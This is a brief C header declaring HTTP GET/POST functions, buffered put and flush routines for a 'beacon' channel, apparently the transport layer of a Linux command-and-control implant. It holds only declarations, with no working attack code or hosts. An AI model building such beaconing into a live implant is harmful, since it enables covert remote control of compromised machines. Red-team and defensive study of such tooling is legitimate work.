#ifndef LINUX_BEACON_CHANNEL_H
#define LINUX_BEACON_CHANNEL_H

#include <stddef.h>
#include <stdint.h>
#include "beacon.h"

typedef struct {
    char  *data;
    size_t size;
} http_response_t;

void http_response_free(http_response_t *r);

int channel_http_get(const char *uri, const sessdata *meta, http_response_t *resp);
int channel_http_post(const char *uri, const char *agent_id,
                      const uint8_t *body, size_t body_len, http_response_t *resp);

void http_put(const char *uri, void *buffer, int len, int post_now);
void http_post_flush(const char *uri);

#endif
